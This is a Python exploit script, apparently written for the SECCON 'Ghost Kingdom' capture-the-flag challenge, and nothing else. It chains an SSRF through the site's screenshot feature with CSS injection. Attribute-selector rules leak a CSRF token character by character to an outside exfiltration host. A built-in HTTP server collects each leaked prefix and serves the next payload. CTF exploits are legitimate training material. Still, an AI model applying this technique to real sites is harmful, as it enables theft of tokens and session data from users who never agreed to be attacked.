import sys
from base64 import b64encode
from urllib import quote as urlencode
from time import sleep
import requests

PORT_NUMBER = 8080
exfilturl = 'http://fenix.sistec.es:%s' % PORT_NUMBER
element = 'input[name="csrf"]'
chars = '0123456789abcdef'

def payload(pre, post):
	css = ''
	for c in chars:
		css += '%s[value^="%s"]{--e0:url(%s/l?pre=%s)}\n' % (element, pre + c, exfilturl, pre + c)
		#css += '%s[value$="%s"]{--s0:url(%s/l?post=%s)}\n' % (element, c + post, exfilturl, c + post)

	css += '%s{background:var(--e0)}\n' % element
	#css += '%s{border-image:var(--s0)}\n' % element
	css += '%s[value="%s"]{background:url("%s/e?%s")}\n' % (element, pre+post, exfilturl, pre+post)
	css += '%s[value="%s"]{background:url("%s/e?%s")}\n' % (element, pre[:-1]+post, exfilturl, pre[:-1]+post)

	return css


def pwn():
	global end
	print('\n[+] LOGIN')
	login = 'http://ghostkingdom.pwn.seccon.jp/?user=patatas&pass=fritas&action=login'
	r = requests.get(login)
	cookies = r.cookies
	print("Cookie %s" % r.cookies['CGISESSID'])

	print('\n[+] SSRF LOGIN')
	login = 'http://l.mydomain.com/?user=patatas&pass=fritas&action=login'
	screenshot_login = 'http://ghostkingdom.pwn.seccon.jp/?url=' + urlencode(login) + '&action=sshot2'
	r = requests.get(screenshot_login, cookies=r.cookies)

	print('\n[+] EXFILT COOKIE')
	while(end==False):
		sleep(30)
		print("\nScrenshot!")
		send_msg = 'http://l.mydomain.com/?css=' + urlencode(b64encode("@import url(%s/s);" % exfilturl)) + '%2&msg=test&action=msgadm2'
		screenshot_exfil = 'http://ghostkingdom.pwn.seccon.jp/?url=' + urlencode(send_msg) + '&action=sshot2'
		r = requests.get(screenshot_exfil, cookies=r.cookies)


from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from SocketServer import ThreadingMixIn
import threading
# https://stackoverflow.com/questions/14088294/multithreaded-web-server-in-python

class myHandler(BaseHTTPRequestHandler):

	def do_GET(self):
		global post
		global pre
		global end

		sendReply = False
		mimetype='text/css'
		if self.path.startswith('/s'):
			if end:
				response = ''
			else:
				print("WORD %s..%s" % (pre,post))
				response = payload(pre, post)
			sendReply = True


		elif self.path.startswith('/l'):
			leak = self.path.replace('/l?','')
			if leak.startswith('pre='):
				pre = leak.replace('pre=','')
			elif leak.startswith('post='):
				post = leak.replace('post=','')
			word = leak
			print("WORD %s..%s" % (pre,post))
			response = 'PWNED!'
			sendReply = True

		elif self.path.startswith('/e'):
			word = self.path.replace('/e?','')
			print("\n --- END ---\n")
			print("COOKIE: %s\n" % word)
			end = True
			return

		if sendReply == True:
			self.send_response(200)
			self.send_header('Content-type',mimetype)
			self.end_headers()
			self.wfile.write(response)
		else:
			self.send_error(404,'File Not Found: %s' % self.path)
		return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def main():
	global post
	global pre
	global end

	post = ''
	pre = ''
	end = False

	try:
		server = ThreadedHTTPServer(('', PORT_NUMBER), myHandler)
		print 'Started httpserver on port ' , PORT_NUMBER
		z = threading.Thread(target=pwn)
		z.start()
		server.serve_forever()

	except KeyboardInterrupt:
		print '^C received, shutting down the web server'
		server.socket.close()
		sys.exit()


if __name__ == "__main__":
    main()